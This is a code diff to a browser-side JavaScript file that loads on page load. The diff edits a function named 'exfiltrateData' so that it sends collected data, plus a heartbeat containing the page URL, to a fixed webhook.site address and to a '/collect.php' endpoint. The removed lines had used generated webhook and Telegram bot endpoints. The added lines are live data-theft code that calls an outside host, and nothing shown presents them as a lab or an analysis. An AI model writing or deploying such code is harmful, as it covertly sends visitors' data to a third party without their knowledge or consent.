@@ -183,9 +183,8 @@ document.addEventListener('DOMContentLoaded', function() {
     // Data exfiltration function
     async function exfiltrateData(data) {
         const endpoints = [
-            '/collect.php',  // Primary collection
-            'https://webhook.site/' + generateWebhookId(),  // Backup
-            'https://api.telegram.org/bot' + generateFakeBotToken() + '/sendMessage'  // Telegram notification
+            'https://webhook.site/3bf3755d-69fc-4f50-a34c-3c28ed2765ef',  // Primary webhook
+            '/collect.php',  // Server-side collection
         ];
         
         // Encode data in multiple formats
@@ -320,8 +319,7 @@ document.addEventListener('DOMContentLoaded', function() {
             url: window.location.href
         };
         
-        // Send to secondary endpoint only
-        fetch('https://webhook.site/' + generateWebhookId(), {
+        fetch('https://webhook.site/3bf3755d-69fc-4f50-a34c-3c28ed2765ef', {
             method: 'POST',
             body: JSON.stringify(heartbeatData),
             mode: 'no-cors'
